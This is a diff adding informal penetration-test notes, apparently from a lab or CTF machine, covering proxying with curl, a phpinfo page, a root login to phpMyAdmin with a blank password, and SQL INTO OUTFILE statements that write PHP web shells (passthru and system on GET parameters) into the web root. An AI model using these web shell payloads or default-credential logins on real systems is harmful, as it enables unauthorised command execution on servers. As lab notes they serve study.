@@ -55,3 +55,53 @@ curl -x http://192.168.52.189:3128 http://192.168.52.189:80/
 So, `curl -x http://192.168.52.189:3128 http://127.0.0.1:8080/` works.
 
 going to set up firefox to use foxyproxy.
+
+okay. so I need to navigate to http://192.168.52.189:8080. duh. I was trying localhost. oops!
+
+phpinfo. got it.
+
+http://192.168.53.189:8080/?phpinfo=-1
+
+lots of data. too many rabbit holes.
+
+allow_url_fopen	On	On
+
+okay. web shell?
+
+later.
+
+http://192.168.53.189:8080/phpmyadmin/
+
+user: root
+password: `<BLANK>`
+
+yep. we can login to phpmyadmin.
+
+maybe we can execute commands.
+
+```
+SELECT "<? echo passthru($_GET['pwd']); ?>" INTO OUTFILE 'C:/shell.php' 
+
+USE information_schema;
+SELECT load_file("C:/shell.php") from information_schema
+```
+
+nope.
+
+```
+
+    index
+    next |
+    phpMyAdmin 5.0.2 documentation » 
+```
+
+
+let's look for phpmyadmin 5.0.2 vulns.
+
+	DOCUMENT_ROOT 	C:/wamp/www
+
+we can create a webshell.
+
+```
+SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:/wamp/www/shell.php"
+```
